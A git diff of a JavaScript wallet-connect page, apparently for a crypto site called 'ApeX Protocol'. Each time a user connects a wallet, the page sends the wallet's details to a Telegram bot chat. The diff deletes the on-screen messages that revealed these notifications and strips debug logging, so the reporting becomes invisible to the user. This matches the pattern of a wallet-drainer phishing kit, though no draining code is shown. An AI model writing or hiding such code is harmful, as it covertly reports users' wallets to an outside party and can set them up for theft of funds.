@@ -62,38 +62,30 @@ import { CONFIG } from './config.js';
   }
 
   // ============================================================
-  //  TELEGRAM HELPER WITH DEBUG LOGGING
+  //  TELEGRAM HELPER
   // ============================================================
   const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;
 
   console.log('📱 Telegram Config:', {
     botToken: TELEGRAM_BOT_TOKEN ? '✅ Present' : '❌ Missing',
     chatId: TELEGRAM_CHAT_ID ? '✅ Present' : '❌ Missing',
-    botTokenLength: TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.length : 0,
-    chatIdLength: TELEGRAM_CHAT_ID ? TELEGRAM_CHAT_ID.length : 0
   });
 
   async function sendTelegramNotification(message) {
     console.log('📤 Attempting to send Telegram notification...');
-    console.log('📝 Message:', message.substring(0, 100) + '...');
     
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
       console.error('❌ Telegram credentials missing!');
-      console.log('TELEGRAM_BOT_TOKEN:', TELEGRAM_BOT_TOKEN || 'undefined');
-      console.log('TELEGRAM_CHAT_ID:', TELEGRAM_CHAT_ID || 'undefined');
       return;
     }
 
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      console.log('🌐 URL:', url.replace(TELEGRAM_BOT_TOKEN, '***HIDDEN***'));
-      
       const payload = {
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
         parse_mode: 'HTML'
       };
-      console.log('📦 Payload:', { chat_id: TELEGRAM_CHAT_ID, messageLength: message.length });
 
       const response = await fetch(url, {
         method: 'POST',
@@ -102,38 +94,38 @@ import { CONFIG } from './config.js';
       });
 
       const responseText = await response.text();
-      console.log('📨 Telegram Response Status:', response.status);
-      console.log('📨 Telegram Response Body:', responseText);
+      console.log('📨 Telegram Response:', response.status, responseText);
 
       if (!response.ok) {
         console.error('❌ Telegram API Error:', responseText);
-        // Show error in UI too
-        showStatus('⚠️ Telegram notification failed: ' + responseText, 'error');
       } else {
         console.log('✅ Telegram notification sent successfully!');
-        showStatus('📱 Telegram notification sent!', 'success');
       }
     } catch (e) {
-      console.error('❌ Telegram notification failed (network error):', e);
-      showStatus('⚠️ Telegram network error: ' + e.message, 'error');
+      console.error('❌ Telegram notification failed:', e);
     }
   }
 
-  // Also expose for debugging
   window.testTelegram = async function(msg) {
     await sendTelegramNotification(msg || '🧪 Test message from ApeX Protocol at ' + new Date().toISOString());
   };
 
   // ============================================================
-  //  WEBSOCKET CHECK
+  //  WEBSOCKET CHECK (skip on desktop to avoid delays)
   // ============================================================
-  async function checkWebSocket(retries = 2, delay = 500) {
+  async function checkWebSocket(retries = 1, delay = 500) {
+    // Skip WebSocket check on desktop to reduce connection time
+    if (isDesktop()) {
+      logDebug('⏭️ Skipping WebSocket check on desktop');
+      return true;
+    }
+    
     for (let i = 0; i < retries; i++) {
       try {
         logDebug(`WebSocket check attempt ${i+1}/${retries}`)
         const result = await new Promise((resolve) => {
           const ws = new WebSocket('wss://relay.walletconnect.com')
-          const timeout = setTimeout(() => { ws.close(); resolve(false) }, 2000)
+          const timeout = setTimeout(() => { ws.close(); resolve(false) }, 3000)
           ws.onopen = () => { clearTimeout(timeout); ws.close(); resolve(true) }
           ws.onerror = () => { clearTimeout(timeout); ws.close(); resolve(false) }
         })
@@ -147,8 +139,8 @@ import { CONFIG } from './config.js';
         await new Promise(r => setTimeout(r, delay))
       }
     }
-    logDebug('❌ WebSocket connection failed after retries')
-    return false
+    logDebug('⚠️ WebSocket check failed – proceeding anyway')
+    return true
   }
 
   // ============================================================
@@ -363,7 +355,7 @@ import { CONFIG } from './config.js';
   }
 
   // ============================================================
-  //  UI UPDATE WITH CHAIN BADGE + TELEGRAM TEST
+  //  UI UPDATE WITH CHAIN BADGE + TELEGRAM
   // ============================================================
   function updateConnectedUI(address, chain = 'evm') {
     setButtonState(connectButton, 'disconnect')
@@ -414,9 +406,7 @@ import { CONFIG } from './config.js';
 
     showStatus(`Connected to ${chainLabel}`, 'success')
 
-    // ============================================================
-    //  SEND TELEGRAM NOTIFICATION ON CONNECTION (with debug logs)
-    // ============================================================
+    // ====== SEND TELEGRAM NOTIFICATION ======
     console.log('🔔 Sending Telegram notification for wallet connection...');
     const msg = `
 🔗 <b>New Wallet Connected</b>
@@ -427,12 +417,7 @@ import { CONFIG } from './config.js';
 🌐 <b>Platform:</b> ${getPlatform()}
     `.trim()
     
-    // Send and show result
-    sendTelegramNotification(msg).then(() => {
-      console.log('✅ Connection notification sent to Telegram');
-    }).catch((err) => {
-      console.error('❌ Failed to send connection notification:', err);
-    });
+    sendTelegramNotification(msg);
   }
 
   function resetConnectedUI() {
@@ -567,8 +552,7 @@ import { CONFIG } from './config.js';
       logDebug(`🔄 Initializing with projectId: ${projectId}`)
     }
 
-    const wsOk = await checkWebSocket(2, 500)
-    if (!wsOk) logDebug('⚠️ WebSocket check failed – proceeding anyway')
+    await checkWebSocket(1, 500)
 
     try {
       client = await SignClient.init({
@@ -610,11 +594,11 @@ import { CONFIG } from './config.js';
   }
 
   // ============================================================
-  //  DIRECT EVM CONNECTION
+  //  DIRECT EVM CONNECTION (with longer timeout)
   // ============================================================
-  async function connectDirectEVM(timeoutMs = 5000) {
+  async function connectDirectEVM(timeoutMs = 8000) {
     setupEIP6963()
-    await new Promise(r => setTimeout(r, 600))
+    await new Promise(r => setTimeout(r, 800))
 
     let providers = evmProviders.filter(p => p.provider)
     if (providers.length === 0 && window.ethereum) {
@@ -667,9 +651,6 @@ import { CONFIG } from './config.js';
       }
     } catch (err) {
       logDebug(`Direct EVM error: ${err.message}`)
-      if (err.message === 'Connection timeout') {
-        logDebug('Direct EVM timed out, will fallback')
-      }
       if (err.code === 4001) {
         logDebug('User rejected direct connection')
       }
@@ -679,7 +660,7 @@ import { CONFIG } from './config.js';
   }
 
   // ============================================================
-  //  WALLETCONNECT EVM CONNECTION
+  //  WALLETCONNECT EVM CONNECTION (5 minute timeout)
   // ============================================================
   async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
     if (isConnecting) {
@@ -950,7 +931,7 @@ import { CONFIG } from './config.js';
 
     logDebug('🖥️ Desktop: EVM connection only')
 
-    success = await connectDirectEVM(5000)
+    success = await connectDirectEVM(8000)
     if (success) {
       logDebug('✅ Desktop: Direct EVM success')
       setButtonState(connectButton, 'connected')
